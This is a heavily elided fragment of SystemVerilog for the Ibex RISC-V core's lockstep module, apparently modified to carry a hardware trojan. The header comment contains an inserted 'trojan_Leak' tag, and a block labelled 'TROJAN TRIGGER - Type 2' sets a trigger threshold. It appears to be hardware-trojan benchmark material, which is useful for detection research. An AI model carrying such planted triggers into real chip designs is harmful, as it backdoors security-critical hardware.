...
// This module instantiates_trojan_Leak a second copy of the core logic, and compares it's outputs against
...
module ibex_lockstep import ibex_pkg::*; #(
  ...
  prim_count #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=12255)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 12255;
